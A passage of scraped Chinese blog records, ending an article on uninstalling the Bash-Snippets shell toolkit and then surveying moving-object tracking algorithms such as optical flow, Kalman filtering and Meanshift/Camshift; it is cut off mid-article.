class=\"crayon-h\"> </span><span class=\"crayon-v\">weather</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_24\">卸载</h3>\n<p>你可以使用以下命令来卸载这些工具。</p>\n<p>克隆仓库：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e0d637949230\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git clone https://github.com/alexanderepstein/Bash-Snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e0d637949230-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e0d637949230-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/alexanderepstein/Bash-Snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>进入 Bash-Snippets 目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e10388961065\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cd Bash-Snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e10388961065-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e10388961065-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>运行以下命令来卸载脚本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e13895696232\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./uninstall.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e13895696232-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e13895696232-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">uninstall</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>输入 <code>y</code>，并按下回车键来移除每个脚本。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e16045280743\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDo you wish to uninstall currency [Y/n]: y</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e16045280743-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e16045280743-1\"><span class=\"crayon-st\">Do</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">you </span><span class=\"crayon-e\">wish </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">uninstall </span><span class=\"crayon-i\">currency</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><strong>另请阅读：</strong></p>\n<ul>\n<li><a href=\"https://www.ostechnix.com/cli-fyi-quick-easy-way-fetch-information-ips-emails-domains-lots/\">Cli.Fyi —— 快速而简单地获取诸如 IP、电子邮件、域名等信息的方式</a></li>\n</ul>\n<p>好了，这就是全部了。我必须承认，在测试这些脚本时我印象很深刻。我真的很喜欢将所有有用的脚本组合到一个包中的想法。感谢开发者。试一试，你不会失望的。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114303\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114303votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114303\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/9cc891bb265e3188ae8c776551c233849ead64a5.jpg"}
{"title": "目标跟踪算法分类", "url": "http://blog.jobbole.com/114283/", "create_date": "2018/08/19", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/a1a4de99de0c75eab712542a7dac876f.png"], "url_object_id": "9ca7cbf6cb5acbb805f699d94c210f6b", "praise_nums": 1, "fav_nums": 2, "comment_nums": 0, "tags": "IT技术,算法", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/necp-zwl/p/6486326.html\">张酱油。</a>   </div><h2>运动目标跟踪主流算法大致分类</h2>\n<p>主要基于两种思路：</p>\n<ul>\n<li>a)不依赖于先验知识，直接从图像序列中检测到运动目标，并进行目标识别，最终跟踪感兴趣的运动目标；</li>\n<li>b)依赖于目标的先验知识，首先为运动目标建模，然后在图像序列中实时找到相匹配的运动目标。</li>\n</ul>\n<p>一．运动目标检测</p>\n<p>对于不依赖先验知识的目标跟踪来讲，运动检测是实现跟踪的第一步。运动检测即为从序列图像中将变化区域从背景图像中提取出来。运动目标检测的算法依照目标与摄像机之间的关系可以分为静态背景下运动检测和动态背景下运动检测。</p>\n<p>（一）静态背景</p>\n<p>1.背景差</p>\n<p>2.帧差</p>\n<p>3.GMM</p>\n<p>4.光流</p>\n<p>背景减算法可以对背景的光照变化、噪声干扰以及周期性运动等进行建模，在各种不同情况下它都可以准确地检测出运动目标。因此对于固定摄像头的情形，目前大多数的跟踪算法中都采用背景减算法来进行目标检测。背景减算法的局限性在于它需要一个静态的固定摄像头。</p>\n<p>（二）运动场</p>\n<p>通常情况下，摄像机的运动形式可以分为两种：a)摄像机的支架固定，但摄像机可以偏转、俯仰以及缩放; b)将摄像机装在某个移动的载体上。由于以上两种情况下的背景及前景图像都在做全局运动，要准确检测运动目标的首要任务是进行图像的全局运动估计与补偿。</p>\n<p>考虑到图像帧上各点的全局运动矢量虽不尽相同 (摄像机做平移运动除外 )，但它们均是在同一摄像机模型下的运动，因而应遵循相同的运动模型，可以用同一模型参数来表示。</p>\n<p>全局运动的估计问题就被归结为全局运动模型参数的估计问题，通常使用块匹配法或光流估计法来进行运动参数的估计。</p>\n<p>块匹配</p>\n<p>基于块的运动估算和补偿可算是最通用的算法。可以将图像分割成不同的图像块，假定同一图像小块上的运动矢量是相同的，通过像素域搜索得到最佳的运动矢量估算。块匹配法主要有如下三个关键技术：</p>\n<ul>\n<li>a)匹配法则，如最大相关、最小误差等</li>\n<li>b)搜索方法，如三步搜索法、交叉搜索法等。</li>\n<li>c) 块大小的确定，如分级、自适应等。</li>\n</ul>\n<p>光流法</p>\n<p>光流估计的方法都是基于以下假设：图像灰度分布的变化完全是目标或者场景的运动引起的，也就是说，目标与场景的灰度不随时间变化。这使得光流方法抗噪声能力较差，其应用范围一般局限于目标与场景的灰度保持不变这个假设条件下。另外，大多数的光流计算方法相当复杂，如果没有特别的硬件装置，其处理速度相当慢，达不到实时处理的要求。</p>\n<p>二．目标跟踪</p>\n<p>运动目标的跟踪，即通过目标的有效表达，在图像序列中寻找与目标模板最相似候选目标区位置的过程。简单说，就是在序列图像中为目标定位。运动目标的有效表达除了对运动目标建模外，目标跟踪中常用到的目标特性表达主要包括视觉特征 (图像边缘、轮廓、形状、纹理、区域)、统计特征 (直方图、各种矩特征)、变换系数特征 (傅里叶描绘子、自回归模型)、代数特征 (图像矩阵的奇异值分解)等。除了使用单一特征外，也可通过融合多个特征来提高跟踪的可靠性.</p>\n<p><strong>相似性度量算法 </strong></p>\n<p>对运动目标进行特性提取之后，需要采用一定的相似性度量算法与帧图像进行匹配，从而实现目标跟踪。图像处理与分析理论中，常见的相似性度量方法有欧氏距离、街区距离、棋盘距离、加权距离、巴特查理亚系数、Hausdorff距离等，其中应用最多和最简单的是欧氏距离。</p>\n<p><strong>搜索算法 </strong></p>\n<p>目标跟踪过程中，直接对场景中的所有内容进行匹配计算，寻找最佳匹配位置，需要处理大量的冗余信息，这样运算量比较大，而且没有必要。采用一定的搜索算法对未来时刻目标的位置状态进行估计假设，缩小目标搜索范围便具有了非常重要的意义。其中一类比较常用的方法是预测运动体下一帧可能出现的位置，在其相关区域内寻找最优点。常见的预测算法有Kalman滤波、扩展的Kalman滤波及粒子滤波方法等。</p>\n<p>Kalman滤波器是一个对动态系统的状态序列进行线性最小方差估计的算法。它通过状态方程和观测方程来描述一个动态系统，基于系统以前的状态序列对下一个状态作最优估计，预测时具有无偏、稳定和最优的特点，且具有计算量小、可实时计算的特点，可以准确地预测目标的位置和速度，但其只适合于线性且呈高斯分布的系统。相对于卡尔曼滤波算法，粒子滤波器特别适用于非线性、非高斯系统。粒子滤波算法是一种基于蒙特卡洛和贝叶斯估计理论的最优算法，它以递归的方式对测量数据进行序贯处理，因而无须对以前的测量数据进行存储和再处理，节省了大量的存储空间。在跟踪多形式的目标以及在非线性运动和测量模型中，粒子滤波器具有极好的鲁棒性。</p>\n<p>另一类减小搜索范围的算法是优化搜索方向。均值漂移算法 (Meanshift算法 )、连续自适应均值漂移算法 (Camshift算法 )和置信区域算法都是利用无参估计的方法优化目标模板和候选目标距离的迭代收敛过程，以达到缩小搜索范围的目的。Meanshift算法是利用梯度优化方法实现快速目标定位，能够对非刚性目标实时跟踪，适合于非线性运动目标的跟踪，对目标的变形、旋转等运动有较好的适用性。但是 Meanshift算法在目标跟踪过程中没有利用目标在空间中的运动方向和运动速度信息，当周围环境存在干扰时 (如光线、遮挡 )，容易丢失目标。Camshift算法是在Meanshift算法的基础上，进行了一定的扩展，结合目标色彩信息形成的一种改进的均值漂移算法。由于目标图像的直方图记录的是颜色出现的概率，这种方法不受目标形状变化的影响，可以有效地解决目标变形和部分遮挡的问题，且运算效率较高，但该算法在开始前需要由人工指定跟踪目标。</p>\n<p><strong>目标跟踪分类 </strong></p>\n<p>依据运动目标的表达和相似性度量，运动目标跟踪算法可以分为四类：基于主动轮廓的跟踪、基于特征的跟踪、基于区域的跟踪和基于模型的跟踪。跟踪算法的精度和鲁棒性很大程度上取决于对运动目标的表达和相似性度量的定义，跟踪算法的实时性取决于匹配搜索策略和滤波预测算法。</p>\n<p>1、基于主动轮廓的跟踪</p>\n<p>Kass等人提出的主动轮廓模型，即Snake模型，是在图像域内定义的可变形曲线，通过对其能量函数的最小化，动态轮廓逐步调整自身形状与目标轮廓相一致，该可变形曲线又称为Snake曲线。Snake技术可以处理任意形状物体的任意形变，首先将分割得到的物体边界作为跟踪的初始模板然后确定表征物体真实边界的目标函数，并通过降低目标函数值，使初始轮廓逐渐向物体的真实边界移动。<br>\n基于主动轮廓跟踪的优点是不但考虑来自图像的灰度信息，而且考虑整体轮廓的几何信息，增强了跟踪的可靠性。由于跟踪过程实际上是解的寻优过程，带来的计算量比较大，而且由于 Snake模型的盲目性，对于快速运动的物体或者形变较大的情况，跟踪效果不够理想。</p>\n<p>2、基于特征的跟踪</p>\n<p>基于特征匹配的跟踪方法不考虑运动目标的整体特征，只通过目标图像的一些显著特征来进行跟踪。假定运动目标可以由惟一的特征集合表达，搜索到该相应的特征集合就认为跟踪上了运动目标。除了用单一的特征来实现跟踪外，还可以采用多个特征信息融合在一起作为跟踪特征。基于特征的跟踪主要包括特征提取和特征匹配两个方面。</p>\n<p>(1)特征提取</p>\n<p>特征提取是指从景物的原始图像中提取图像的描绘特征，理想的图像特征应具备的特点是：</p>\n<ul>\n<li>a)特征应具有直观意义，符合人们的视觉特性;</li>\n<li>b)特征应具备较好的分类能力，能够区分不同的图像内容;</li>\n<li>c)特征计算应该相对简单，以便于快速识别;</li>\n<li>d)特征应具备图像平移、旋转、尺度变化等不变性。</li>\n</ul>\n<p>目标跟踪中常用的运动目标的特征主要包括颜色、纹理、边缘、块特征、光流特征、周长、面积、质心、角点等。提取对尺度伸缩、形变和亮度变化不敏感的有效特征至今仍是图像处理研究领域中一个比较活跃的方面。</p>\n<p>(2)特征匹配</p>\n<p>特征提取的目的是进行帧间目标特征的匹配，并以最优匹配来跟踪目标。常见的基于特征匹配的跟踪算法有基于二值化目标图像匹配的跟踪、基于边缘特征匹配或角点特征匹配的跟踪、基于目标灰度特征匹配的跟踪、基于目标颜色特征匹配的跟踪等。</p>\n<p>基于特征的跟踪算法的优点在于对运动目标的尺度、形变和亮度等变化不敏感，即使目标的某一部分被遮挡，只要还有一部分特征可以被看到，就可以完成跟踪任务；另外，这种方法与 Kalman滤波器联合使用，也具有很好的跟踪效果。但是其对于图像模糊、噪声等比较敏感，图像特征的提取效果也依赖于各种提取算子及其参数的设置，此外，连续帧间的特征对应关系也较难确定，尤其是当每一帧图像的特征数目不一致、存在漏检、特征增加或减少等情况。</p>\n<p><strong>3、基于区域的跟踪</strong></p>\n<p>基于区域的跟踪算法基本思想是：</p>\n<ul>\n<li>a)得到包含目标的模板，该模板可通过图像分割获得或预先人为确定，模板通常为略大于目标的矩形，也可为不规则形状;</li>\n<li>b)在序列图像中，运用相关算法跟踪目标。</li>\n</ul>\n<p>这种算法的优点在于当目标未被遮挡时，跟踪精度非常高、跟踪非常稳定。但其缺点首先是费时，当搜索区域较大时情况尤其严重;其次，算法要求目标变形不大，且不能有太大遮挡，否则相关精度下降会造成目标的丢失。近年来，对基于区域的跟踪方法关注较多的是如何处理模板变化时的情况，这种变化是由运动目标姿态变化引起的，如果能正确预测目标的姿态变化，则可实现稳定跟踪。</p>\n<p><strong>4、基于模型的跟踪</strong></p>\n<p>基于模型的跟踪是通过一定的先验知识对所跟踪目标建立模型，然后通过匹配跟踪目标进行模型的实时更新。对于刚体目标来说，其运动状态变换主要是平移、旋转等，可以利用该方法实现目标跟踪。但是实际应用中跟踪的不仅仅是刚体，还有一大部分是非刚体，目标确切的几何模型不容易得到。</p>\n<p>这种方法不易受观测视角的影响，具有较强的鲁棒性，模型匹配跟踪精度高，适合于机动目标的各种运动变化，抗干扰能力强，但由于计算分析复杂、运算速度慢，模型的更新较为复杂，实时性较差。准确建立运动模型是模型匹配能否成功的关键</p>\n<p>1.区域与区域匹配</p>\n<p>这种算法的优点在于当目标未被遮挡时，跟踪精度非常高，跟踪非常稳定。但其缺点首先是费时，当搜索区域较大时情况尤其严重；其次，算法要求目标变形不大，且不能有太大遮挡，否则相关精度下降会造成目标的丢失。</p>\n<p>2.特征点（关键点）跟踪</p>\n<p>KLT：Shi和Tomasi 在1994年提出的KLT 跟踪算法是一种被广泛应用的基于特征点跟踪算法。由于特征点分布在整个目标上，因此即使有一部分被遮挡，仍然可以跟踪到另外一部分特征点，这也是基于特征点跟踪算法的优点。</p>\n<p>基于特征点的跟踪算法中，比较困难的问题是当目标发生旋转或者被遮挡时，如何准确地完成特征点的提取、保存、删除等工作</p>\n<p>3.基于主动轮廓的跟踪算法</p>\n<p>主动轮廓模型也称为Snake 模型，这种方法能较精确地跟踪上目标的轮廓。Snake 模型非常适合可变形目标的跟踪，如对运动细胞的跟踪。这种模型与卡尔曼滤波相结合能够更好地进行跟踪。Snake模型比较适合单目标的跟踪，对于多目标跟踪更多地是采用基于水平集(Level Set)方法的主动轮廓模型</p>\n<p>4.光流</p>\n<p>Lucas-Kanade稀疏光流calcOpticalFlowPyrLK（利用金字塔）</p>\n<p>Horn-Schunck稠密光流calcOpticalFlowHS</p>\n<p>稠密光流需要很大的计算量，OpenCV中对此方法做了简化，即对前后连续帧的一个像素的邻域进行匹配，这种方法叫块匹配。</p>\n<p>稀疏光流需要在跟踪之前指定一组点，如果这些点具有某些明显特征，那么跟踪就会相对稳定和可靠。可见，其运算量比稠密光流要小很多。</p>\n<p>首先利用goodFeaturesToTrack函数得到图像中的强边界作为跟踪的特征点，接下来要调用calcOpticalFlowPyrLK函数，输入两幅连续的图像，并在第一幅图像里选择一组特征点，输出为这组点在下一幅图像中的位置。再把得到的跟踪结果过滤一下，去掉不好的特征点。再把特征点的跟踪路径标示出来。</p>\n<p>（实际效果一般）</p>\n<p>5.mean-shift和 camshift</p>\n<p>Mean-shift优缺点</p>\n<p>meanShift算法用于视频目标跟踪时，采用目标的颜色直方图作为搜索特征，通过不断迭代meanShift向量使得算法收敛于目标的真实位置，从而达到跟踪的目的。</p>\n<p>传统的meanShift算法在跟踪中有几个优势：</p>\n<ul>\n<li>（1）算法计算量不大，在目标区域已知的情况下完全可以做到实时跟踪；</li>\n<li>（2）采用核函数直方图模型，对边缘遮挡、目标旋转、变形和背景运动不敏感。</li>\n</ul>\n<p>同时，meanShift算法也存在着以下一些缺点：</p>\n<ul>\n<li>（1）缺乏必要的模板更新；</li>\n<li>（2）跟踪过程中由于窗口宽度大小保持不变，当目标尺度有所变化时，跟踪就会失败；</li>\n<li>（3）当目标速度较快时，跟踪效果不好；</li>\n<li>（4）直方图特征在目标颜色特征描述方面略显匮乏，缺少空间信息；</li>\n</ul>\n<p>由于其计算速度快，对目标变形和遮挡有一定的鲁棒性，所以，在目标跟踪领域，meanShift算法目前依然受到大家的重视。但考虑到其缺点，在工程实际中也可以对其作出一些改进和调整；例如：</p>\n<ul>\n<li>（1）引入一定的目标位置变化的预测机制，从而更进一步减少meanShift跟踪的搜索时间，降低计算量；</li>\n<li>（2）可以采用一定的方式来增加用于目标匹配的“特征”；</li>\n<li>（3）将传统meanShift算法中的核函数固定带宽改为动态变化的带宽；</li>\n<li>（4）采用一定的方式对整体模板进行学习和更新；</li>\n</ul>\n<p><strong>CamShift算法</strong></p>\n<p>CamShift算法的全称是”ContinuouslyAdaptive Mean-SHIFT”，即：连续自适应的MeanShift算法。其基本思想是对视频序列的所有图像帧都作MeanShift运算，并将上一帧的结果（即搜索窗口的中心位置和窗口大小）作为下一帧MeanShift算法的搜索窗口的初始值，如此迭代下去。简单点说，meanShift是针对单张图片寻找最优迭代结果，而camShift则是针对视频序列来处理，并对该序列中的每一帧图片都调用meanShift来寻找最优迭代结果。正是由于camShift针对一个视频序列进行处理，从而保证其可以不断调整窗口的大小，如此一来，当目标的大小发生变化的时候，该算法就可以自适应地调整目标区域继续跟踪。</p>\n<p>在OpenCV自带的camShift的例子当中，是通过计算目标在HSV空间下的H分量直方图，通过直方图反向投影得到目标像素的概率分布，然后通过调用OpenCV的CAMSHIFT算法，自动跟踪并调整目标窗口的中心位置与大小。该算法对于简单背景下的单目标跟踪效果较好，但如果被跟踪目标与背景颜色或周围其它目标颜色比较接近，则跟踪效果较差。另外，由于采用颜色特征，所以它对被跟踪目标的形状变化有一定的抵抗能力。</p>\n<p>OpenCV自带例子中的camShift算法，可以分为三个部分：</p>\n<p>A、计算色彩投影图（反向投影）：</p>\n<ul>\n<li>（1）为了减少光照变化对目标跟踪的影响，首先将图像从RGB颜色空间转换到HSV颜色空间；</li>\n<li>（2）对H分量进行直方图统计，直方图代表了不同H分量取值出现的概率，或者说可以据此查找出H分量的大小为x时的概率或像素个数，即，得到颜色概率查找表；</li>\n<li>（3）将图像中每个像素的值用其颜色出现的概率进行替换，由此得到颜色概率分布图；</li>\n</ul>\n<p>以上三个步骤称之为反向投影，需要提醒的是，颜色概率分布图是一个灰度图像；</p>\n<p>B、meanShift寻优</p>\n<p>前面提到过meanShift算法（<a 